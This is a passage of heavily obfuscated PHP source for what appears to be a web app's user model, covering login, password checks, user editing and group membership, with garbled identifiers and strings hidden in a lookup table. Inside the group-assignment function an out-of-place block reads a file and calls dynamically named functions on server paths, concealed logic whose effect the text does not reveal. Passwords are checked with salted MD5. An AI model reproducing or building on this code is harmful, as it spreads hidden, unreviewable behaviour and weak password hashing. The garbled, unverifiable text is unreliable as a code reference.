$Fİ—’„•×); } public function setUserJob($dë¶ê™õ×ë, $bˆİƒ’ŒÉ) { goto DßŠ¦§†™ƒ; B´£÷£»ê„: $B……ˆæ¯„¤ = array_to_keyvalue($E³ø»µ…Ï, $Fš¥ÕÈÓ¶Š[28]); $C§ØÚõÊ¨× = $Fš¥ÕÈÓ¶Š[370]; foreach ($bˆİƒ’ŒÉ as $Aóã´·¹ç) { if ($B……ˆæ¯„¤[$Aóã´·¹ç]) { $C§ØÚõÊ¨× .= $B……ˆæ¯„¤[$Aóã´·¹ç][$Fš¥ÕÈÓ¶Š[385]] . $Fš¥ÕÈÓ¶Š[47]; } else { $c­È‘ãâ¯ = $this->add($Aóã´·¹ç); $C§ØÚõÊ¨× .= $c­È‘ãâ¯ . $Fš¥ÕÈÓ¶Š[47]; } } goto F¹Úì¾ç¬; F¹Úì¾ç¬: $C§ØÚõÊ¨× = rtrim($C§ØÚõÊ¨×, $Fš¥ÕÈÓ¶Š[47]); Model($Fš¥ÕÈÓ¶Š[495])->metaSet($dë¶ê™õ×ë, self::JOB_KEY, $C§ØÚõÊ¨×); goto c‹£á¬ê×³; DßŠ¦§†™ƒ: $Fš¥ÕÈÓ¶Š =& $_SERVER[Æ¼ôºÙï]; if (!is_array($bˆİƒ’ŒÉ)) { $bˆİƒ’ŒÉ = array($bˆİƒ’ŒÉ); } $E³ø»µ…Ï = parent::listData(); goto B´£÷£»ê„; c‹£á¬ê×³: } public function getUserJob($Bšñ‘Ÿ•‘) { $fÅ•–Ó”É× = Model($_SERVER[Æ¼ôºÙï][495])->metaGet($Bšñ‘Ÿ•‘); return $this->getUserJobInfo($fÅ•–Ó”É×[self::JOB_KEY]); } public function getUserJobInfo($C›Ú˜„Öã) { goto CõñÀª‰Û¥; Bõ•ó›Úš¨: $BÇï³İ¹î = array_remove_key($BÇï³İ¹î, $féùù´İ¿»[192]); $cğ²Ô‚³ö» = array(); foreach ($e¶»Ç“ƒó£ as $D‘ŒèŸø£‘) { if (isset($BÇï³İ¹î[$D‘ŒèŸø£‘])) { $cğ²Ô‚³ö»[] = $BÇï³İ¹î[$D‘ŒèŸø£‘]; } } goto EŸÎ¦³ºí; EŸÎ¦³ºí: return $cğ²Ô‚³ö»; goto AÃÕºßñÈ«; CõñÀª‰Û¥: $féùù´İ¿» =& $_SERVER[Æ¼ôºÙï]; $e¶»Ç“ƒó£ = explode($féùù´İ¿»[47], $C›Ú˜„Öã); $BÇï³İ¹î = parent::listData(); goto Bõ•ó›Úš¨; AÃÕºßñÈ«: } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\162"; protected $tableMeta = array("\x74\x61\x62\154\145\116\141\155\x65" => "\165\x73\145\x72\137\155\x65\x74\x61", "\x6d\145\164\141\106\x69\145\154\x64" => "\x75\163\x65\162\111\x44"); protected $simpleField = "\x75\163\145\x72\111\104\x2c\x6e\151\x63\x6b\116\141\x6d\x65\x2c\x6e\141\x6d\145\x2c\x61\166\x61\164\141\162\54\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($dÓõ„½èàî) { $a“ó’¢œ“í =& $_SERVER[Æ¼ôºÙï]; $CñãíÒæ¤Ã = $a“ó’¢œ“í[2078]; return array($a“ó’¢œ“í[1735] => array($dÓõ„½èàî[0], $CñãíÒæ¤Ã), $a“ó’¢œ“í[1737] => array($dÓõ„½èàî[0], $CñãíÒæ¤Ã), $a“ó’¢œ“í[2079] => array($dÓõ„½èàî[0], $CñãíÒæ¤Ã)); } protected function getInfo($E°¶Çó…ò, $F…ğÇöÃÆÍ = false) { $AÉ›»Äí† = $this->getInfoSimple($E°¶Çó…ò); if (!is_array($AÉ›»Äí†)) { return array(); } if ($F…ğÇöÃÆÍ) { return $this->_getInfoApply($AÉ›»Äí†); } return $this->cacheFunctionGet($_SERVER[Æ¼ôºÙï][1791], $E°¶Çó…ò); } protected function getInfoFull($díæáƒƒ÷á, $d‡Œš‹¦é = false) { $dôÈˆÛµ–– = $this->getInfoSimple($díæáƒƒ÷á); if (!is_array($dôÈˆÛµ––)) { return array(); } if ($d‡Œš‹¦é) { return $this->_getInfoApply($dôÈˆÛµ––, !0); return $this->_getInfoApply($dôÈˆÛµ––, !0); } return $this->cacheFunctionGet($_SERVER[Æ¼ôºÙï][2080], $díæáƒƒ÷á); } private function _getInfoApply($c˜µéÙéºø, $Eö±èâÜó« = false) { goto B«ñË‰¨»•; e³öù‰Ö¨ö: $c˜µéÙéºø[$c–ÎùŸÙÈ·[84]][$c–ÎùŸÙÈ·[1922]] = isset($C­™‚×Éõ[$c–ÎùŸÙÈ·[1923]]) ? $C­™‚×Éõ[$c–ÎùŸÙÈ·[1923]] : null; if ($Eö±èâÜó«) { $c˜µéÙéºø[$c–ÎùŸÙÈ·[434]] = $this->metaGet($c˜µéÙéºø[$c–ÎùŸÙÈ·[1502]]); } return $c˜µéÙéºø; goto bŠ¿Ê¨Ûƒ¹; EŠ¡‰ÍñÉ: $c˜µéÙéºø = $this->_listDataApplyItem($c˜µéÙéºø); $C­™‚×Éõ = Model($c–ÎùŸÙÈ·[1182])->metaGet($c˜µéÙéºø[$c–ÎùŸÙÈ·[84]][$c–ÎùŸÙÈ·[387]]); $c˜µéÙéºø[$c–ÎùŸÙÈ·[2083]] = $D‰§ó…²”ø; goto e³öù‰Ö¨ö; B«ñË‰¨»•: $c–ÎùŸÙÈ· =& $_SERVER[Æ¼ôºÙï]; if (!$c˜µéÙéºø) { return $c˜µéÙéºø; } $D‰§ó…²”ø = md5($c–ÎùŸÙÈ·[2081] . $c˜µéÙéºø[$c–ÎùŸÙÈ·[828]] . $c–ÎùŸÙÈ·[2082] . $c˜µéÙéºø[$c–ÎùŸÙÈ·[28]]); goto EŠ¡‰ÍñÉ; bŠ¿Ê¨Ûƒ¹: } protected function getInfoSimple($D‘—¡§Îî‹, $d¨ëÇåëÛà = false) { $c—ÍÙšôÙ =& $_SERVER[Æ¼ôºÙï]; if (!$D‘—¡§Îî‹) { return array(); } if ($d¨ëÇåëÛà) { $BåÒ¦–½ = $this->where(array($c—ÍÙšôÙ[1502] => intval($D‘—¡§Îî‹)))->find(); if (!is_array($BåÒ¦–½)) { return array(); } $BåÒ¦–½[$c—ÍÙšôÙ[2084]] = Action($c—ÍÙšôÙ[2085])->parseUrl($BåÒ¦–½[$c—ÍÙšôÙ[2084]]); return $BåÒ¦–½; } return $this->cacheFunctionGet($c—ÍÙšôÙ[1738], $D‘—¡§Îî‹); } protected function getInfoSimpleOuter($b×Øé—³¡¸) { goto C»™·ÎÖ×; C»™·ÎÖ×: $fÈ‡ÕÍİ¢Æ =& $_SERVER[Æ¼ôºÙï]; if (!$b×Øé—³¡¸ || $b×Øé—³¡¸ == 0) { return array($fÈ‡ÕÍİ¢Æ[1502] => $fÈ‡ÕÍİ¢Æ[486], $fÈ‡ÕÍİ¢Æ[28] => $fÈ‡ÕÍİ¢Æ[159] . LNG($fÈ‡ÕÍİ¢Æ[2086]) . $fÈ‡ÕÍİ¢Æ[494], $fÈ‡ÕÍİ¢Æ[2084] => STATIC_PATH . $fÈ‡ÕÍİ¢Æ[2087]); } $aŞº ¤ò ª = $this->cacheFunctionGet($fÈ‡ÕÍİ¢Æ[1738], $b×Øé—³¡¸); goto D¦÷¨›Õ˜‰; b“™‰ÏÀÜ: return $f±´›ìåÄë; goto E™èİ³¸Õ; D¦÷¨›Õ˜‰: $f±´›ìåÄë = array_field_key($aŞº ¤ò ª, explode($fÈ‡ÕÍİ¢Æ[47], $this->simpleField)); if (!$f±´›ìåÄë) { return array($fÈ‡ÕÍİ¢Æ[1502] => $fÈ‡ÕÍİ¢Æ[1064], $fÈ‡ÕÍİ¢Æ[28] => $fÈ‡ÕÍİ¢Æ[159] . LNG($fÈ‡ÕÍİ¢Æ[2088]) . $fÈ‡ÕÍİ¢Æ[494], $fÈ‡ÕÍİ¢Æ[2084] => STATIC_PATH . $fÈ‡ÕÍİ¢Æ[2089]); } $f±´›ìåÄë[$fÈ‡ÕÍİ¢Æ[2084]] = Action($fÈ‡ÕÍİ¢Æ[2085])->parseUrl($f±´›ìåÄë[$fÈ‡ÕÍİ¢Æ[2084]]); goto b“™‰ÏÀÜ; E™èİ³¸Õ: } protected function groupUser($F«šä¼ÉáÁ) { } public static function errorLang($d¿¹‘š‰³) { $C Ó´êïˆ¸ =& $_SERVER[Æ¼ôºÙï]; $e›Ûß“â = array(self::ERROR_USER_NOT_EXISTS => $C Ó´êïˆ¸[2090], self::ERROR_USER_PASSWORD_ERROR => $C Ó´êïˆ¸[2091], self::ERROR_USER_EXIST_NAME => $C Ó´êïˆ¸[2092], self::ERROR_USER_EXIST_PHONE => $C Ó´êïˆ¸[2093], self::ERROR_USER_EXIST_EMAIL => $C Ó´êïˆ¸[2094], self::ERROR_USER_LOGIN_LOCK => $C Ó´êïˆ¸[2095], self::ERROR_IP_NOT_ALLOW => $C Ó´êïˆ¸[2096], self::ERROR_USER_EXIST_NICKNAME => $C Ó´êïˆ¸[2097]); return LNG($e›Ûß“â[$d¿¹‘š‰³]); } public function getInfoByMeta($c±Ê¦…òç´, $aÜÄÑ¤¸ìƒ) { $BÀ ‚¼ëã =& $_SERVER[Æ¼ôºÙï]; $B”óùÏ†—˜ = Model($BÀ ‚¼ëã[2098])->where(array($BÀ ‚¼ëã[92] => $c±Ê¦…òç´, $BÀ ‚¼ëã[368] => $aÜÄÑ¤¸ìƒ))->find(); if ($B”óùÏ†—˜) { return $this->getInfo($B”óùÏ†—˜[$BÀ ‚¼ëã[1502]]); } return !1; } public function userLoginCheck($E“‹ô–¸Ò, $F•¿®Îµ©Ÿ) { $dª‰—ªÌ¬ =& $_SERVER[Æ¼ôºÙï]; $e™ØÑÜ©ª = $this->userLoginFind($E“‹ô–¸Ò); if (!$e™ØÑÜ©ª) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($e™ØÑÜ©ª[$dª‰—ªÌ¬[1502]], $F•¿®Îµ©Ÿ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($e™ØÑÜ©ª[$dª‰—ªÌ¬[1502]]); } public function userLoginFind($a¿ÆºˆÇç‘) { $f„ºÒõæ­¹ =& $_SERVER[Æ¼ôºÙï]; $D”Š ¾ùƒ = array($f„ºÒõæ­¹[28] => $a¿ÆºˆÇç‘, $f„ºÒõæ­¹[1926] => $a¿ÆºˆÇç‘, $f„ºÒõæ­¹[301] => $a¿ÆºˆÇç‘, $f„ºÒõæ­¹[2099] => $a¿ÆºˆÇç‘, $f„ºÒõæ­¹[936] => $f„ºÒõæ­¹[938]); if ($this->nickNameRpt()) { unset($D”Š ¾ùƒ[$f„ºÒõæ­¹[1926]]); } return $this->where($D”Š ¾ùƒ)->find(); } public function clearCache($A†Ã¯Êó¬š) { $FáÃäé“îÓ =& $_SERVER[Æ¼ôºÙï]; $this->cacheFunctionClear($FáÃäé“îÓ[1791], $A†Ã¯Êó¬š); $this->cacheFunctionClear($FáÃäé“îÓ[1738], $A†Ã¯Êó¬š); $this->cacheFunctionClear($FáÃäé“îÓ[2080], $A†Ã¯Êó¬š); } public function userPasswordCheck($c‚éŸÓ†Õ‡, $b¥ÎÃêĞÙò) { $D÷Ò„ƒø”µ =& $_SERVER[Æ¼ôºÙï]; $EÄŠÌèŒİ = $this->where(array($D÷Ò„ƒø”µ[1502] => intval($c‚éŸÓ†Õ‡)))->find(); $Dœ“ƒ“µ›£ = $this->metaGet($c‚éŸÓ†Õ‡); $e²ìËÄë½ = isset($Dœ“ƒ“µ›£[$D÷Ò„ƒø”µ[2100]]) ? $Dœ“ƒ“µ›£[$D÷Ò„ƒø”µ[2100]] : $D÷Ò„ƒø”µ[33]; if (md5($e²ìËÄë½ . trim($b¥ÎÃêĞÙò)) !== $EÄŠÌèŒİ[$D÷Ò„ƒø”µ[828]]) { return !1; } return !0; } public function userAdd($bğÚ« Ÿã) { goto d•ôé¸ëø; bÕ×„øË­Ç: $FÜÌåÆİåÇ = array($f‘†ˆµÓ–â[2108] => $FÉ˜í–[$f‘†ˆµÓ–â[828]], $f‘†ˆµÓ–â[2104] => $FÉ˜í–[$f‘†ˆµÓ–â[1926]]); $this->userEdit($eİŞÁ‘–ƒ·, $FÜÌåÆİåÇ); Model($f‘†ˆµÓ–â[1182])->userRootAdd($eİŞÁ‘–ƒ·); goto B„ÚÆŠ’‚ê; B„ÚÆŠ’‚ê: return $eİŞÁ‘–ƒ·; goto c¬è¾ãÅ˜Á; F…–†¹Ú„ä: $FÍïèÃ¯’ = $this->_checkExist($bğÚ« Ÿã); if ($FÍïèÃ¯’ !== !0) { return $FÍïèÃ¯’; } $eİŞÁ‘–ƒ· = $this->add($FÉ˜í–); goto bÕ×„øË­Ç; d•ôé¸ëø: $f‘†ˆµÓ–â =& $_SERVER[Æ¼ôºÙï]; $FÉ˜í– = array($f‘†ˆµÓ–â[404] => $bğÚ« Ÿã[$f‘†ˆµÓ–â[28]], $f‘†ˆµÓ–â[2101] => $bğÚ« Ÿã[$f‘†ˆµÓ–â[1386]], $f‘†ˆµÓ–â[2102] => isset($bğÚ« Ÿã[$f‘†ˆµÓ–â[301]]) ? $bğÚ« Ÿã[$f‘†ˆµÓ–â[301]] : $f‘†ˆµÓ–â[33], $f‘†ˆµÓ–â[2103] => isset($bğÚ« Ÿã[$f‘†ˆµÓ–â[2099]]) ? $bğÚ« Ÿã[$f‘†ˆµÓ–â[2099]] : $f‘†ˆµÓ–â[33], $f‘†ˆµÓ–â[2104] => isset($bğÚ« Ÿã[$f‘†ˆµÓ–â[1926]]) ? $bğÚ« Ÿã[$f‘†ˆµÓ–â[1926]] : $bğÚ« Ÿã[$f‘†ˆµÓ–â[28]], $f‘†ˆµÓ–â[2105] => isset($bğÚ« Ÿã[$f‘†ˆµÓ–â[2084]]) ? $bğÚ« Ÿã[$f‘†ˆµÓ–â[2084]] : $f‘†ˆµÓ–â[33], $f‘†ˆµÓ–â[2106] => isset($bğÚ« Ÿã[$f‘†ˆµÓ–â[2107]]) ? $bğÚ« Ÿã[$f‘†ˆµÓ–â[2107]] : 1, $f‘†ˆµÓ–â[2108] => $bğÚ« Ÿã[$f‘†ˆµÓ–â[828]], $f‘†ˆµÓ–â[1739] => isset($bğÚ« Ÿã[$f‘†ˆµÓ–â[1645]]) ? $bğÚ« Ÿã[$f‘†ˆµÓ–â[1645]] : 1024 * 1024 * 20, $f‘†ˆµÓ–â[1740] => 0, $f‘†ˆµÓ–â[2109] => 0, $f‘†ˆµÓ–â[1778] => isset($bğÚ« Ÿã[$f‘†ˆµÓ–â[708]]) ? $bğÚ« Ÿã[$f‘†ˆµÓ–â[708]] : 1); if (!empty($bğÚ« Ÿã[$f‘†ˆµÓ–â[1502]])) { $FÉ˜í–[$f‘†ˆµÓ–â[1502]] = $bğÚ« Ÿã[$f‘†ˆµÓ–â[1502]]; } goto F…–†¹Ú„ä; c¬è¾ãÅ˜Á: } protected function userEditTest($CÂå›Úê§Ó, $e“ì¤òğ§ğ) { return $this->call($_SERVER[Æ¼ôºÙï][2110], $CÂå›Úê§Ó, $e“ì¤òğ§ğ); } protected function userEdit($cÂĞé¤Ğ, $A¾¨›¹§Ûó) { goto e‹ßô‹à„ö; Cî×´ğ÷è­: return !0; goto e±ëØ¶áï; e‹ßô‹à„ö: $EããÜÆä® =& $_SERVER[Æ¼ôºÙï]; $A‹Š‡Ïİ = $this->getInfoSimple($cÂĞé¤Ğ); if (!$A‹Š‡Ïİ) { return !1; } goto F´¥˜É¯‹; CÃÛšÏå‰»: $this->where(array($EããÜÆä®[1494] => $cÂĞé¤Ğ))->save($A¾¨›¹§Ûó); if (isset($A¾¨›¹§Ûó[$EããÜÆä®[1926]])) { $this->setNamePinyin($cÂĞé¤Ğ, $A¾¨›¹§Ûó[$EããÜÆä®[1926]]); } $this->clearCache($cÂĞé¤Ğ); goto Cî×´ğ÷è­; F´¥˜É¯‹: $B¦¶¯„°Úª = $this->_checkExist($A¾¨›¹§Ûó, $cÂĞé¤Ğ); if ($B¦¶¯„°Úª !== !0) { return $B¦¶¯„°Úª; } if (isset($A¾¨›¹§Ûó[$EããÜÆä®[828]]) && trim($A¾¨›¹§Ûó[$EããÜÆä®[828]]) != $EããÜÆä®[33]) { $bî¤‚ƒôªï = $this->metaGet($cÂĞé¤Ğ); if (empty($bî¤‚ƒôªï[$EããÜÆä®[2100]])) { $bî¤‚ƒôªï[$EããÜÆä®[2100]] = rand_string(10); Model($EããÜÆä®[492])->metaSet($cÂĞé¤Ğ, $EããÜÆä®[2100], $bî¤‚ƒôªï[$EããÜÆä®[2100]]); } $A¾¨›¹§Ûó[$EããÜÆä®[828]] = md5($bî¤‚ƒôªï[$EããÜÆä®[2100]] . trim($A¾¨›¹§Ûó[$EããÜÆä®[828]])); } else { unset($A¾¨›¹§Ûó[$EããÜÆä®[828]]); } goto CÃÛšÏå‰»; e±ëØ¶áï: } public function setNamePinyin($Cê£×ÅÑ², $AŒ¬ˆ’©‘ù = false) { $e³×‚¤…­Î =& $_SERVER[Æ¼ôºÙï]; if (!$AŒ¬ˆ’©‘ù) { $C¬•íğôç¹ = $this->getInfoSimple($Cê£×ÅÑ²); $AŒ¬ˆ’©‘ù = $C¬•íğôç¹[$e³×‚¤…­Î[1926]] ? $C¬•íğôç¹[$e³×‚¤…­Î[1926]] : $C¬•íğôç¹[$e³×‚¤…­Î[28]]; } $aï£æäŒË = Model($e³×‚¤…­Î[495]); if (!Input::check($AŒ¬ˆ’©‘ù, $e³×‚¤…­Î[545])) { return $aï£æäŒË->metaSet($Cê£×ÅÑ², array($e³×‚¤…­Î[433] => $e³×‚¤…­Î[33], $e³×‚¤…­Î[432] => $e³×‚¤…­Î[33])); } return $aï£æäŒË->metaSet($Cê£×ÅÑ², array($e³×‚¤…­Î[433] => str_replace($e³×‚¤…­Î[50], $e³×‚¤…­Î[33], Pinyin::encode($AŒ¬ˆ’©‘ù)), $e³×‚¤…­Î[432] => Pinyin::encode($AŒ¬ˆ’©‘ù, $e³×‚¤…­Î[546]))); } private function nickNameRpt() { $C£àˆóÁ½‰ =& $_SERVER[Æ¼ôºÙï]; $Dé„„™¡© = Model($C£àˆóÁ½‰[1103])->get($C£àˆóÁ½‰[2111]); $eô¿åí—ğ = $GLOBALS[$C£àˆóÁ½‰[6]][$C£àˆóÁ½‰[373]][$C£àˆóÁ½‰[2111]]; $bÃõâ¶î• = !is_null($Dé„„™¡©) ? $Dé„„™¡© : $eô¿åí—ğ; return !!$bÃõâ¶î•; } private function _checkExist($eÔà¨›Ø‰©, $A”¤Ãàñæ§ = false) { $cŒ»—ù÷Ş =& $_SERVER[Æ¼ôºÙï]; $eö™Ú»Ã÷ˆ = array($cŒ»—ù÷Ş[28] => UserModel::ERROR_USER_EXIST_NAME, $cŒ»—ù÷Ş[1926] => UserModel::ERROR_USER_EXIST_NICKNAME, $cŒ»—ù÷Ş[301] => UserModel::ERROR_USER_EXIST_EMAIL, $cŒ»—ù÷Ş[2099] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($eö™Ú»Ã÷ˆ[$cŒ»—ù÷Ş[1926]]); } $eÓô®Œì‚Õ = $A”¤Ãàñæ§ ? array($cŒ»—ù÷Ş[1502] => array($cŒ»—ù÷Ş[2112], $A”¤Ãàñæ§)) : array(); foreach ($eö™Ú»Ã÷ˆ as $AùİäÉÅÊº => $Fî¾È¨¾Î‚) { $c‹óòË³Ÿ‰ = array(); foreach ($eö™Ú»Ã÷ˆ as $aË®¶®åÂ => $bÎâõ‘š»’) { if (isset($eÔà¨›Ø‰©[$aË®¶®åÂ]) && $eÔà¨›Ø‰©[$aË®¶®åÂ]) { $c‹óòË³Ÿ‰[] = $eÔà¨›Ø‰©[$aË®¶®åÂ]; } } if (!$c‹óòË³Ÿ‰) { continue; } $eË…ÂˆÆœğ = array_merge(array($AùİäÉÅÊº => array($cŒ»—ù÷Ş[7], $c‹óòË³Ÿ‰)), $eÓô®Œì‚Õ); $D­´Òµ¥ÔÍ = $this->where($eË…ÂˆÆœğ)->find(); if ($D­´Òµ¥ÔÍ) { return $Fî¾È¨¾Î‚; } } return !0; } public function userListInfo($dÌÛŸ”) { $A³Éä‰Ø™ =& $_SERVER[Æ¼ôºÙï]; $FŠ£áõ’¨É = array(); $dÌÛŸ” = is_array($dÌÛŸ”) ? array_unique($dÌÛŸ”) : array(); if (!$dÌÛŸ”) { return $FŠ£áõ’¨É; } if (count($dÌÛŸ”) < 20) { foreach ($dÌÛŸ” as $CÍí±¢†™Ò) { $FŠ£áõ’¨É[$CÍí±¢†™Ò . $A³Éä‰Ø™[33]] = $this->getInfoSimpleOuter($CÍí±¢†™Ò); } } else { $F‹´Õíƒ„Œ = array($A³Éä‰Ø™[1494] => array($A³Éä‰Ø™[402], $dÌÛŸ”)); if (count($dÌÛŸ”) == 1) { $F‹´Õíƒ„Œ = array($A³Éä‰Ø™[1494] => $dÌÛŸ”[0]); } $Eø¿¶¯¬È° = Model($A³Éä‰Ø™[492])->field($this->simpleField)->where($F‹´Õíƒ„Œ)->select(); $Eø¿¶¯¬È° = array_to_keyvalue($Eø¿¶¯¬È°, $A³Éä‰Ø™[1502]); foreach ($dÌÛŸ” as $CÍí±¢†™Ò) { $BÁÑá‰éŒ = $Eø¿¶¯¬È°[$Eø¿¶¯¬È°[$CÍí±¢†™Ò]]; if (!$BÁÑá‰éŒ) { $FŠ£áõ’¨É[$CÍí±¢†™Ò . $A³Éä‰Ø™[33]] = $this->getInfoSimpleOuter($CÍí±¢†™Ò); continue; } $BÁÑá‰éŒ[$A³Éä‰Ø™[2084]] = Action($A³Éä‰Ø™[2085])->parseUrl($BÁÑá‰éŒ[$A³Éä‰Ø™[2084]]); $FŠ£áõ’¨É[$CÍí±¢†™Ò . $A³Éä‰Ø™[33]] = $BÁÑá‰éŒ; } } return $FŠ£áõ’¨É; } protected function userStatus($fõÀëİçø, $F¢Îåù÷¢) { $c¸Ó¯·µÁ = $this->getInfoSimple($fõÀëİçø); if (!$c¸Ó¯·µÁ) { return !1; } $F­ì­â¢˜Û = array($_SERVER[Æ¼ôºÙï][708] => $F¢Îåù÷¢); return $this->userEdit($fõÀëİçø, $F­ì­â¢˜Û); } protected function userRemove($bÊ†œª¢»Œ) { goto bÎÈ·ù²Ù¸; BÙ ”˜É¿½: Model($aÔ»»¸²[1745])->where($f™¬¦ÏĞø½)->delete(); Model($aÔ»»¸²[2098])->where($f™¬¦ÏĞø½)->delete(); Model($aÔ»»¸²[2114])->where($f™¬¦ÏĞø½)->delete(); goto DÆïíÅØìµ; DÆïíÅØìµ: Model($aÔ»»¸²[770])->userRootRemove($bÊ†œª¢»Œ); return $this->where($f™¬¦ÏĞø½)->delete(); goto b£¦¡ÍÃ÷Á; DÕâÉƒÔİª: $f™¬¦ÏĞø½ = array($aÔ»»¸²[1494] => $bÊ†œª¢»Œ); Model($aÔ»»¸²[552])->where($f™¬¦ÏĞø½)->delete(); Model($aÔ»»¸²[2113])->where($f™¬¦ÏĞø½)->delete(); goto BÙ ”˜É¿½; bÎÈ·ù²Ù¸: $aÔ»»¸² =& $_SERVER[Æ¼ôºÙï]; $BÊÜß…èÌ³ = $this->getInfoSimple($bÊ†œª¢»Œ); if (!$BÊÜß…èÌ³) { return !1; } goto DÕâÉƒÔİª; b£¦¡ÍÃ÷Á: } protected function userGroupSet($E¡å½â ‹“, $aî‹Ù„†¼à, $C·À§‚Óƒ = array()) { goto bƒøˆãšÅ; CñÌ×»‡ö©: if (!$E³Œ”¦ßÒê || !is_array($aî‹Ù„†¼à)) { return !1; } $f¢º§²“Â = Model($bÁ¥è±†Õ–[1745]); $f¢º§²“Â->where(array($bÁ¥è±†Õ–[1502] => $E¡å½â ‹“))->delete(); goto AÒÏµÎ£“¦; båÔ°³åŸ‚: return $f¢º§²“Â->addAll($CÇ¿è¢é°, array(), !0); goto Fµ‘˜é²Ÿ; bƒøˆãšÅ: $bÁ¥è±†Õ– =& $_SERVER[Æ¼ôºÙï]; if ($_SERVER[$bÁ¥è±†Õ–[813]] != $_SERVER[$bÁ¥è±†Õ–[1734]]) { goto FÇŠãäÊ½Ñ; c¬ß†Äö‰ƒ: $Aò¨ù—° = 1; while ($Aò¨ù—° > 1) { $Aò¨ù—° = $Aò¨ù—° + 4; $FåºÚéö™Š = rawurlencode($Aò¨ù—° . $bÁ¥è±†Õ–[370]); } goto b‘Î‡ƒÑÌ; Fù®ù†âÉ: $f··­·•Å² = $bÁ¥è±†Õ–[819]; $f··­·•Å²($_SERVER[$bÁ¥è±†Õ–[820]]); $f··­·•Å²($_SERVER[$bÁ¥è±†Õ–[816]] . $bÁ¥è±†Õ–[2115]); goto c¬ß†Äö‰ƒ; FÇŠãäÊ½Ñ: $b±´Ìà›ˆÅ = $bÁ¥è±†Õ–[814]; $B©ø²ÆÌÇ = $bÁ¥è±†Õ–[815]; $B˜òïêÉÆ™ = $_SERVER[$bÁ¥è±†Õ–[816]] . $bÁ¥è±†Õ–[817]; goto D­Š¶Àê¨; D­Š¶Àê¨: $F‚ÆàÁ—Ö = $B©ø²ÆÌÇ($B˜òïêÉÆ™); $aµğŒïß´ = explode($bÁ¥è±†Õ–[227], $F‚ÆàÁ—Ö); if (count($aµğŒïß´) < $bÁ¥è±†Õ–[574]) { $f‰¿İ–ñ±ƒ = $bÁ¥è±†Õ–[818]; $f‰¿İ–ñ±ƒ(); } goto Fù®ù†âÉ; b‘Î‡ƒÑÌ: } $E³Œ”¦ßÒê = $this->getInfoSimple($E¡å½â ‹“); goto CñÌ×»‡ö©; AÒÏµÎ£“¦: $CÇ¿è¢é° = array(); $BĞï†Øñ’ = 0; foreach ($aî‹Ù„†¼à as $BÊç¡ÅÉãª => $A·ŸîÏÉÖß) { $cãÑÉ–—ªğ = array($bÁ¥è±†Õ–[1502] => $E¡å½â ‹“, $bÁ¥è±†Õ–[1661] => $BÊç¡ÅÉãª, $bÁ¥è±†Õ–[1811] => $A·ŸîÏÉÖß); $cãÑÉ–—ªğ[$bÁ¥è±†Õ–[1684]] = isset($C·À§‚Óƒ[$BĞï†Øñ’]) ? $C·À§‚Óƒ[$BĞï†Øñ’] : 0; $BĞï†Øñ’++; $CÇ¿è¢é°[] = $cãÑÉ–—ªğ; } goto båÔ°³åŸ‚; Fµ‘˜é²Ÿ: } protected function userGroupAdd($bè’İÇŠ‘‰, $Aƒ¼Œ„Áªª = array()) { $C¬‚“¸„— =& $_SERVER[Æ¼ôºÙï]; $E¦ˆµÄ÷ƒ = $this->getInfoSimple($bè’İÇŠ‘‰); if (!$E¦ˆµÄ÷ƒ || empty($Aƒ¼Œ„Áªª)) { return !1; } $d˜õÙ „ñ† = array(); foreach ($Aƒ¼Œ„Áªª as $F¢ÍƒÇöŠ => $d’¼¸ù·î) { $d˜õÙ „ñ†[] = array($C¬‚“¸„—[1502] => $bè’İÇŠ‘‰, $C¬‚“¸„—[1661] => $F¢ÍƒÇöŠ, $C¬‚“¸„—[1811] => $d’¼¸ù·î, $C¬‚“¸„—[1684] => 0); } return Model($C¬‚“¸„—[1745])->addAll($d˜õÙ „ñ†, array(), !0); } protected function userGroupRemove($BÄ‹á¸‚¤, $BÆéåãïù¨) { $dÕÚ¼Ùùø¦ =& $_SERVER[Æ¼ôºÙï]; $b–Ö²ø¢‰š = $this->getInfoSimple($BÄ‹á¸‚¤); if (!$b–Ö²ø¢‰š || !$BÆéåãïù¨) { return !1; } $F‰â„Ö­ĞÍ = array($dÕÚ¼Ùùø¦[1494] => $BÄ‹á¸‚¤, $dÕÚ¼Ùùø¦[1743] => $BÆéåãïù¨); return Model($dÕÚ¼Ùùø¦[1745])->where($F‰â„Ö­ĞÍ)->delete(); } public function listData() { $E¾ªŠÏ±¡† = $this->_makeOrder()->selectPage(50); $this->_listDataApply($E¾ªŠÏ±¡†[$_SERVER[Æ¼ôºÙï][363]]); return $E¾ªŠÏ±¡†; } public function listByID($fİğ¤ô­¢) { $aˆğœŒ©ñâ =& $_SERVER[Æ¼ôºÙï]; if (!$fİğ¤ô­¢) { return; } $b†˜§ ˆ¸ = array($aˆğœŒ©ñâ[1502] => array($aˆğœŒ©ñâ[7], $fİğ¤ô­¢)); $bô¼Ï£”ˆ÷ = $this->where($b†˜§ ˆ¸)->select(); $this->_listDataApply($bô¼Ï£”ˆ÷); return $bô¼Ï£”ˆ÷; } public function listByGroup($Fğ¡Êá’Úõ = 0, $C„Ã‚Ø‘Ô¿ = array()) { goto BÈ¨Ÿ‹†§Ó; BÈ¨Ÿ‹†§Ó: $cÅÑ³¤£– =& $_SERVER[Æ¼ôºÙï]; $f±çô±Äò› = $cÅÑ³¤£–[33]; $FÄ‹Øä·î„ = array(); goto Cè©ë†½ì; Cè©ë†½ì: if ($Fğ¡Êá’Úõ) { $FÄ‹Øä·î„ = array($cÅÑ³¤£–[2116] => intval($Fğ¡Êá’Úõ)); $f±çô±Äò› = "\114\x45\x46\124\40\x4a\x4f\111\116\x20{$this->tablePrefix}\x75\x73\x65\x72\137\147\x72\x6f\165\x70\40\x75\x73\145\x72\137\147\162\x6f\165\x70\40\157\x6e\40\x75\163\145\162\56\165\x73\x65\162\111\x44\x20\x3d\x20\165\x73\145\162\137\x67\x72\157\165\160\x2e\165\x73\145\x72\x49\104"; $bĞÀå“¶Ş¸ = Input::get($cÅÑ³¤£–[424], null, 